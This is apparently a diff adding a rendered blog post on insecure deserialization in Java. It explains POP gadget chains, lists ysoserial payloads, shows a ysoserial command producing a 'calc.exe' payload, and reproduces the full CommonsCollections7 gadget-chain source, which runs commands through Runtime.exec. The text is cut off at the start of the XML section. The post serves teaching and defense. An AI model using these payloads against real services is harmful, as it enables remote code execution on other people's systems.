+  .markdown-body abbr[title]:after {
+    content: " (" attr(title) ")";
+  }
+
+  .markdown-body .ir a:after,
+  .markdown-body a[href^="javascript:"]:after,
+  .markdown-body a[href^="#"]:after {
+    content: "";
+  }
+
+  .markdown-body pre {
+    white-space: pre;
+    white-space: pre-wrap;
+    word-wrap: break-word;
+  }
+
+  .markdown-body pre,
+  .markdown-body blockquote {
+    border: 1px solid #999;
+    padding-right: 1em;
+    page-break-inside: avoid;
+  }
+
+  .markdown-body .progress,
+  .markdown-body .progress-bar {
+    -moz-box-shadow: none;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+  }
+
+  .markdown-body .progress {
+    border: 1px solid #ddd;
+  }
+
+  .markdown-body .progress-bar {
+    height: 22px;
+    border-right: 1px solid #ddd;
+  }
+
+  .markdown-body tr,
+  .markdown-body img {
+    page-break-inside: avoid;
+  }
+
+  .markdown-body img {
+    max-width: 100% !important;
+  }
+
+  .markdown-body p,
+  .markdown-body h2,
+  .markdown-body h3 {
+    orphans: 3;
+    widows: 3;
+  }
+
+  .markdown-body h2,
+  .markdown-body h3 {
+    page-break-after: avoid;
+  }
+}
+</style><style>/*GitHub*/
+.codehilite {background-color:#fff;color:#333333;}
+.codehilite .hll {background-color:#ffffcc;}
+.codehilite .c{color:#999988;font-style:italic}
+.codehilite .err{color:#a61717;background-color:#e3d2d2}
+.codehilite .k{font-weight:bold}
+.codehilite .o{font-weight:bold}
+.codehilite .cm{color:#999988;font-style:italic}
+.codehilite .cp{color:#999999;font-weight:bold}
+.codehilite .c1{color:#999988;font-style:italic}
+.codehilite .cs{color:#999999;font-weight:bold;font-style:italic}
+.codehilite .gd{color:#000000;background-color:#ffdddd}
+.codehilite .ge{font-style:italic}
+.codehilite .gr{color:#aa0000}
+.codehilite .gh{color:#999999}
+.codehilite .gi{color:#000000;background-color:#ddffdd}
+.codehilite .go{color:#888888}
+.codehilite .gp{color:#555555}
+.codehilite .gs{font-weight:bold}
+.codehilite .gu{color:#800080;font-weight:bold}
+.codehilite .gt{color:#aa0000}
+.codehilite .kc{font-weight:bold}
+.codehilite .kd{font-weight:bold}
+.codehilite .kn{font-weight:bold}
+.codehilite .kp{font-weight:bold}
+.codehilite .kr{font-weight:bold}
+.codehilite .kt{color:#445588;font-weight:bold}
+.codehilite .m{color:#009999}
+.codehilite .s{color:#dd1144}
+.codehilite .n{color:#333333}
+.codehilite .na{color:teal}
+.codehilite .nb{color:#0086b3}
+.codehilite .nc{color:#445588;font-weight:bold}
+.codehilite .no{color:teal}
+.codehilite .ni{color:purple}
+.codehilite .ne{color:#990000;font-weight:bold}
+.codehilite .nf{color:#990000;font-weight:bold}
+.codehilite .nn{color:#555555}
+.codehilite .nt{color:navy}
+.codehilite .nv{color:teal}
+.codehilite .ow{font-weight:bold}
+.codehilite .w{color:#bbbbbb}
+.codehilite .mf{color:#009999}
+.codehilite .mh{color:#009999}
+.codehilite .mi{color:#009999}
+.codehilite .mo{color:#009999}
+.codehilite .sb{color:#dd1144}
+.codehilite .sc{color:#dd1144}
+.codehilite .sd{color:#dd1144}
+.codehilite .s2{color:#dd1144}
+.codehilite .se{color:#dd1144}
+.codehilite .sh{color:#dd1144}
+.codehilite .si{color:#dd1144}
+.codehilite .sx{color:#dd1144}
+.codehilite .sr{color:#009926}
+.codehilite .s1{color:#dd1144}
+.codehilite .ss{color:#990073}
+.codehilite .bp{color:#999999}
+.codehilite .vc{color:teal}
+.codehilite .vg{color:teal}
+.codehilite .vi{color:teal}
+.codehilite .il{color:#009999}
+.codehilite .gc{color:#999;background-color:#EAF2F5}
+</style><title>readme</title></head><body><article class="markdown-body"><h1 id="the-big-problem-of-serialization">The big problem of serialization<a class="headerlink" href="#the-big-problem-of-serialization" title="Permanent link"></a></h1>
+<p>One of the biggest security issues affecting OOP Languages during the last years was &ldquo;Unsafe Deserialization&rdquo;. As a wide range of literature is already available for this issue, this post objective is not to introduce something new about it, but to provide a brief and precise explaination of the vulnerability, as well as common exploitation and detection methods applied on different programming languages. </p>
+<h2 id="serialization-what-is-it">Serialization: What is it?<a class="headerlink" href="#serialization-what-is-it" title="Permanent link"></a></h2>
+<p>Object serialization, also known as &ldquo;marshalling&rdquo;, is just a process that converts an object-state, in the form of an arbitratily complicated data structure, in a way (commonly a serialized string) that can be easily sent in message, or stored in a database or a text file. The serialized object-state could then be reconstructed using the opposite process, called deserialization, or &ldquo;unmarshalling&rdquo;, producing an object that is &ldquo;semantically&rdquo; identical to the original.</p>
+<p>If we look at just the definition, it seems to be an easy process, but effectively it&rsquo;s not. Serialization is a low-level technique that violates encapsulation and breaks the opacity of an abstract data type. </p>
+<p>In many programming languages, the ones we are more interested in, serialization is natively supported (usually within core libraries) and no additional code development is required.</p>
+<p>These languages are:</p>
+<ul>
+<li>PHP</li>
+<li>Java</li>
+<li>.NET</li>
+<li>NodeJS</li>
+<li>Python</li>
+<li>Ruby</li>
+</ul>
+<p>The result of the serialization process is the so called &ldquo;archive&rdquo;, or archive medium.
+Serialization archive formats fall into two main categories: text-based (stream of text characters) and binary format (stream of bytes). Typical examples of text-based formats include raw text format, JavaScript Object Notation (JSON) and Extensible Markup Language (XML). Binary formats are more implementation-dependent and are not so standardized.
+The advantages of using a text-based archive over a binary archive is portability and human-readability (which allows easier debugging), but usually is more time-consuming, while using binary formats would be faster and easier, but at the cost of readability and portability.
+There is a third category usually referred to as &ldquo;Hybrid&rdquo;, like PHP serialization, Python pickle and others.
+At the time of writing, JSON and XML are the most known and standardised formats.</p>
+<ul>
+<li>JSON: text format that supports tree-like object structures and allows simple validation</li>
+<li>XML: self-descriptive text format that supports tree-like object structures and allows data validation; however it takes a lot of memory.</li>
+</ul>
+<h2 id="deserialization-what-i-need-to-know">Deserialization: What I need to know?<a class="headerlink" href="#deserialization-what-i-need-to-know" title="Permanent link"></a></h2>
+<p>Now that we know what it is, how can this be used to trigger a vulnerability?
+Well, the truth is that deserialization is not vulnerable by itself. As many other examples in code development, things can be implemented securely or not.
+This lead to the definition of &ldquo;Insecure Deserialization&rdquo;, and it&rsquo;s actually a combination of factors which altogether allow the exploitation of the deserialization process.</p>
+<p>The main concept behind insecure deserialization is that we can force the application loading an arbitrary class object during the unmarshalling process, eventually achieving different things, from DoS to RCE.</p>
+<p>But what are these conditions? The conditions needed to exploit the deserialization process may very depending on language and platform involved.</p>
+<p>WHile proceeding further, it&rsquo;s necessary to define the generic structure of a deserialization exploit:</p>
+<ol>
+<li>Find an application endpoint that deserialize user controllable data</li>
+<li>Find a <strong>Gadget</strong> for exploitation</li>
+<li>Develop a serializer to build the payload (Ready-to-use tools are available)</li>
+<li>Use the payload against the endpoint</li>
+</ol>
+<p>Important to define at this point is the concept of <strong>Gadget</strong>. If you are familiar with binary exploitation, you should have some knowledge on ROP gadgets, that are commonly used to exploit application bypassing DEP/NX. The concept here is quite similar, while POP (Property Oriented Programming) is used instead of ROP. POP gadgets are classes or piece of classes with the following characteristics:</p>
+<ul>
+<li>Can be serialized</li>
+<li>Has public properties (class variables, we&rsquo;ll specify later on)</li>
+<li>Implements specific vulnerable methods</li>
+<li>[Language dependent: Has access to other &ldquo;callable&rdquo; classes]</li>
+</ul>
+<p>Formally, a set of gadgets may be enough constitute a Turing-complete language, in which case, it is possible for an attacker to achieve RCE on the target application, using a POP chain.</p>
+<h3 id="java">Java<a class="headerlink" href="#java" title="Permanent link"></a></h3>
+<p>The following chapter will focus on JAVA based deserialization issues, and will be divided by archive format, binary and text-based.</p>
+<h4 id="java-binary-seriliazed-archive">Java: Binary Seriliazed Archive<a class="headerlink" href="#java-binary-seriliazed-archive" title="Permanent link"></a></h4>
+<p>In JAVA, objects can be serialiazed only if their class implements the <code>java.io.Serializable</code> interface. 
+The most common method used to serialize objects is using ByteStreams. A simple example is provided below:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.io.FileInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.FileOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.Serializable</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">Desert</span> <span class="kd">implements</span> <span class="n">Serializable</span><span class="o">{</span>
+
+    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="n">serialVersionUID</span> <span class="o">=</span> <span class="mi">1L</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="n">String</span> <span class="n">name</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kt">int</span> <span class="n">width</span><span class="o">;</span>
+    <span class="kd">public</span> <span class="kt">int</span> <span class="n">height</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="nf">Desert</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="kt">int</span> <span class="n">i</span><span class="o">,</span> <span class="kt">int</span> <span class="n">j</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">// Constructor</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">name</span> <span class="o">=</span> <span class="n">name</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">width</span> <span class="o">=</span> <span class="n">i</span><span class="o">;</span>
+        <span class="k">this</span><span class="o">.</span><span class="na">height</span> <span class="o">=</span> <span class="n">j</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">Deserialize</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">try</span><span class="o">{</span>
+            <span class="c1">//Creating an input stream to reconstruct the object from serialised data</span>
+            <span class="n">ObjectInputStream</span> <span class="n">in</span><span class="o">=</span><span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="s">&quot;de.ser&quot;</span><span class="o">));</span>
+            <span class="n">Desert</span> <span class="n">desert</span><span class="o">=(</span><span class="n">Desert</span><span class="o">)</span><span class="n">in</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+            <span class="c1">// Showing the data of the serialised object</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;The desert: &quot;</span> <span class="o">+</span> <span class="n">desert</span><span class="o">.</span><span class="na">name</span><span class="o">);</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Has a surface of: &quot;</span> <span class="o">+</span> <span class="n">String</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="n">desert</span><span class="o">.</span><span class="na">width</span><span class="o">*</span><span class="n">desert</span><span class="o">.</span><span class="na">height</span><span class="o">)</span> <span class="o">);</span>
+            <span class="c1">// Closing the stream</span>
+            <span class="n">in</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="o">}</span><span class="k">catch</span><span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+                <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+                <span class="o">}</span>
+            <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">Serialize</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">// Creating the object</span>
+            <span class="n">Desert</span> <span class="n">desert</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Desert</span><span class="o">(</span><span class="s">&quot;Mobi&quot;</span><span class="o">,</span> <span class="mi">2000</span><span class="o">,</span> <span class="mi">1500</span><span class="o">);</span>
+            <span class="c1">// Creating output stream and writing the serialised object</span>
+            <span class="n">FileOutputStream</span> <span class="n">outfile</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="s">&quot;de.ser&quot;</span><span class="o">);</span>
+            <span class="n">ObjectOutputStream</span> <span class="n">outstream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">outfile</span><span class="o">);</span>
+            <span class="n">outstream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">desert</span><span class="o">);</span>
+            <span class="n">outstream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+            <span class="c1">// closing the stream</span>
+            <span class="n">outstream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Serialized data saved to de.ser&quot;</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="o">{</span>
+        <span class="kt">boolean</span> <span class="n">serialize</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+
+        <span class="k">if</span> <span class="o">(</span><span class="n">serialize</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">Desert</span><span class="o">.</span><span class="na">Serialize</span><span class="o">();</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="n">Desert</span><span class="o">.</span><span class="na">Deserialize</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+
+<p>Once executed, it would give us the following file:</p>
+<div class="codehilite"><pre>$ hexdump.exe -C de.ser
+00000000  ac ed 00 05 73 72 00 06  44 65 73 65 72 74 31 91  |....sr..Desert1.|
+00000010  71 33 04 c2 c7 18 02 00  03 49 00 06 68 65 69 67  |q3.......I..heig|
+00000020  68 74 49 00 05 77 69 64  74 68 4c 00 04 6e 61 6d  |htI..widthL..nam|
+00000030  65 74 00 12 4c 6a 61 76  61 2f 6c 61 6e 67 2f 53  |et..Ljava/lang/S|
+00000040  74 72 69 6e 67 3b 78 70  00 00 05 dc 00 00 07 d0  |tring;xp........|
+00000050  74 00 04 4d 6f 62 69                              |t..Mobi|
+00000057
+</pre></div>
+
+<p>The starting bytes, <code>ac ed 00 05</code> are a known signature for JAVA serialized objects. Prior to step further on, we should notice that the <code>Deserialize</code> function, calls one of the potentially exploitable function of JAVA, <code>readObject()</code>. This function, indeed, constitutes one of the POP gadget of JAVA. During the deserialization via <code>readObject()</code>, the serialized-object properties are accessed recursively, untill every properties have been read. This process occurs due to the nature of serialization (As an exact clone of the original object is the result of this process, each and every properties must be read and re-instantiated). </p>
+<p>How can we exploit it? Basically, the trick is to pass an arbitrary nested object to the <code>readObject()</code> function, forcing the application to instantiate a chain of POP gadgets, leading to RCE. The POP gadgets that can be used may vary depending on the application <code>CLASSPATH</code> (as any gadget function must be on the classpath in order to be instantiated [Visibility Constraint]). 
+The ROP chain uses an opaque class order in order to chain subsequent classes using reflection, which allows dynamic class and method loading even without prior knowledge of these classes and methods. The main pattern used to create chains is to use the DynamicProxy pattern, which more details can be found <a href="https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html">here</a>.</p>
+<p>Following, a very basic example of DynamicProxy implementation:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationHandler</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DynamicProxy</span> <span class="kd">implements</span> <span class="n">InvocationHandler</span> <span class="o">{</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">proxy</span><span class="o">,</span> <span class="n">Method</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> 
+      <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&quot;Invoked method: &quot;</span> <span class="o">+</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
+        <span class="k">return</span> <span class="n">method</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span> <span class="n">args</span><span class="o">[])</span> <span class="o">{</span>
+        <span class="n">Map</span> <span class="n">proxyInstance</span> <span class="o">=</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span>
+        <span class="n">DynamicProxy</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> 
+        <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span> <span class="n">Map</span><span class="o">.</span><span class="na">class</span> <span class="o">},</span> 
+        <span class="k">new</span> <span class="n">DynamicProxy</span><span class="o">());</span>
+
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">proxyInstance</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
+    <span class="o">}</span>   
+<span class="o">}</span>
+</pre></div>
+
+<p>The above, would produce as output &ldquo;toString&rdquo;. It should be noted that the use of <code>map</code>, is arbitrary, whatever object classs could be used on its place. The idea of using this approach is that we can bind arbitrary code to execute whenever a specific method is invoked.</p>
+<p>During the years, a set of common libraries were identified that can be used to build POP chains. These libraries are known as <strong>gadget libraries</strong>.</p>
+<p>These common libraries can be automatically used to generate exploit payloads, using a very powerful tool named <strong>ysoserial</strong>, available <a href="https://github.com/frohoff/ysoserial">here</a>.</p>
+<p>The available payloads are listed below:
+<div class="codehilite"><pre>     Payload             Authors                                Dependencies
+     -------             -------                                ------------
+     BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
+     C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
+     Clojure             @JackOfMostTrades                      clojure:1.8.0
+     CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
+     CommonsCollections1 @frohoff                               commons-collections:3.1
+     CommonsCollections2 @frohoff                               commons-collections4:4.0
+     CommonsCollections3 @frohoff                               commons-collections:3.1
+     CommonsCollections4 @frohoff                               commons-collections4:4.0
+     CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1
+     CommonsCollections6 @matthias_kaiser                       commons-collections:3.1
+     CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
+     FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
+     Groovy1             @frohoff                               groovy:2.3.9
+     Hibernate1          @mbechler
+     Hibernate2          @mbechler
+     JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     JRMPClient          @mbechler
+     JRMPListener        @mbechler
+     JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
+     JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
+     Jdk7u21             @frohoff
+     Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
+     MozillaRhino1       @matthias_kaiser                       js:1.7R2
+     MozillaRhino2       @_tint0                                js:1.7R2
+     Myfaces1            @mbechler
+     Myfaces2            @mbechler
+     ROME                @mbechler                              rome:1.0
+     Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
+     Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
+     URLDNS              @gebl
+     Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
+     Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4
+</pre></div></p>
+<p>For the Deserialization example provided above, let&rsquo;s suppose we wanted to craft a payload using ysoserial and CommonsCollection7:</p>
+<div class="codehilite"><pre><span class="nv">$ </span>ysoserial CommonsCollections7 <span class="s2">&quot;cmd /c calc.exe&quot;</span> &gt; ./Serialize/de.ser
+</pre></div>
+
+<p>If you try to open it uing the example JAVA file, of course it won&rsquo;t work, showing a <code>java.lang.ClassNotFoundException: org.apache.commons.collections.map.LazyMap</code> exception. The reason is always the &ldquo;visibility constraint&rdquo;. As this payload uses <code>CommonsCollections:3.1</code>, which is not part of standard JAVA SDK, the POP gadgets to build the required chain cannot be found. In order to make it working, we should be sure to have this dependency in the application classpath. A working example, where the <code>org.apache.commons-collections:3.1</code> dependency has been added, can be found <a href="C:/Users/d3adc0de/Desktop/Shared/PenetrationTesting/Git%20Personal%20Projects/klezVirus.github.io/The_Big_Problem_of_Serialisation/serialization/java">here</a>. </p>
+<p>Now that we have a general understanding of the process, let&rsquo;s try to describe the full steps occuring during deserialisation in Java using CommonsCollections.</p>
+<p>Payloads generated with ysoserial share a common structure, which use a Payload Runner using maps to setup the conditions and a transformer to actually build and run the OS command. </p>
+<p>Let&rsquo;s take a deep look at CommonsCollections7:</p>
+<p><div class="codehilite"><pre><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CommonsCollections7</span> <span class="kd">extends</span> <span class="n">PayloadRunner</span> <span class="kd">implements</span> <span class="n">ObjectPayload</span><span class="o">&lt;</span><span class="n">Hashtable</span><span class="o">&gt;</span> <span class="o">{</span>
+
+    <span class="kd">public</span> <span class="n">Hashtable</span> <span class="nf">getObject</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span> <span class="n">command</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+
+        <span class="c1">// Reusing transformer chain and LazyMap gadgets from previous payloads</span>
+        <span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">execArgs</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="n">command</span><span class="o">};</span>
+
+        <span class="kd">final</span> <span class="n">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="o">(</span><span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{});</span>
+
+        <span class="kd">final</span> <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]{</span>
+            <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="n">Runtime</span><span class="o">.</span><span class="na">class</span><span class="o">),</span>
+            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;getMethod&quot;</span><span class="o">,</span>
+                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Class</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="s">&quot;getRuntime&quot;</span><span class="o">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;invoke&quot;</span><span class="o">,</span>
+                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">Object</span><span class="o">[].</span><span class="na">class</span><span class="o">},</span>
+                <span class="k">new</span> <span class="n">Object</span><span class="o">[]{</span><span class="kc">null</span><span class="o">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]}),</span>
+            <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="o">(</span><span class="s">&quot;exec&quot;</span><span class="o">,</span>
+                <span class="k">new</span> <span class="n">Class</span><span class="o">[]{</span><span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">},</span>
+                <span class="n">execArgs</span><span class="o">),</span>
+            <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="o">(</span><span class="mi">1</span><span class="o">)};</span>
+
+        <span class="n">Map</span> <span class="n">innerMap1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">Map</span> <span class="n">innerMap2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+
+        <span class="c1">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span>
+        <span class="n">Map</span> <span class="n">lazyMap1</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap1</span><span class="o">,</span> <span class="n">transformerChain</span><span class="o">);</span>
+        <span class="n">lazyMap1</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;yy&quot;</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+
+        <span class="n">Map</span> <span class="n">lazyMap2</span> <span class="o">=</span> <span class="n">LazyMap</span><span class="o">.</span><span class="na">decorate</span><span class="o">(</span><span class="n">innerMap2</span><span class="o">,</span> <span class="n">transformerChain</span><span class="o">);</span>
+        <span class="n">lazyMap2</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">&quot;zZ&quot;</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+
+        <span class="c1">// Use the colliding Maps as keys in Hashtable</span>
+        <span class="n">Hashtable</span> <span class="n">hashtable</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">();</span>
+        <span class="n">hashtable</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">lazyMap1</span><span class="o">,</span> <span class="mi">1</span><span class="o">);</span>
+        <span class="n">hashtable</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">lazyMap2</span><span class="o">,</span> <span class="mi">2</span><span class="o">);</span>
+
+        <span class="n">Reflections</span><span class="o">.</span><span class="na">setFieldValue</span><span class="o">(</span><span class="n">transformerChain</span><span class="o">,</span> <span class="s">&quot;iTransformers&quot;</span><span class="o">,</span> <span class="n">transformers</span><span class="o">);</span>
+
+        <span class="c1">// Needed to ensure hash collision after previous manipulations</span>
+        <span class="n">lazyMap2</span><span class="o">.</span><span class="na">remove</span><span class="o">(</span><span class="s">&quot;yy&quot;</span><span class="o">);</span>
+
+        <span class="k">return</span> <span class="n">hashtable</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">PayloadRunner</span><span class="o">.</span><span class="na">run</span><span class="o">(</span><span class="n">CommonsCollections7</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+Let&rsquo;s dissect the above code:</p>
+<ol>
+<li>Using <code>readObject()</code>, the JVM looks for the serialized Object&rsquo;s class in the ClassPath. <ul>
+<li>Class not found -&gt; throws  exception(ClassNotFoundException)</li>
+<li>Class found -&gt;  java.util.Hashmap.reconsitutionPut is called </li>
+</ul>
+</li>
+<li>We forced an hash collishion, so a comparison is issued using <code>equals</code></li>
+<li>The decorator forwards the method to the AbstractMap -&gt; lazyMap</li>
+<li>The lazyMap attempts to retrieve a value with key equal to the map</li>
+<li>Since that key does not exist, the lazyMap instance goes ahead and tries to create a new key</li>
+<li>Since  a  chainedTransformer  is  set  to  execute  during  the  key  creation process, the chained transformer with the malicious payload is invoked, leading to remote code execution.</li>
+</ol>
+<h4 id="java-text-based-seriliazation-archive">Java: Text-based Seriliazation Archive<a class="headerlink" href="#java-text-based-seriliazation-archive" title="Permanent link"></a></h4>
+<p>Of course, this is problem doesn&rsquo;t affect just the binary archive format, but can be extended to text-based serialization archives. As we said, the most common formats used are XML and JSON.</p>
+<p><strong>XML</strong></p>
+<p>XML Serialization/Deserialization is mainly offered by the XMLEncoder/XMLDecoder and XStream classes. These classes are known to be susceptible to deserialisation issues leading to RCE.</p>
+<p>Let&rsquo;s consider the following example:</p>
+<div class="codehilite"><pre><span class="kn">import</span> <span class="nn">java.beans.XMLDecoder</span><span class="o">;</span>
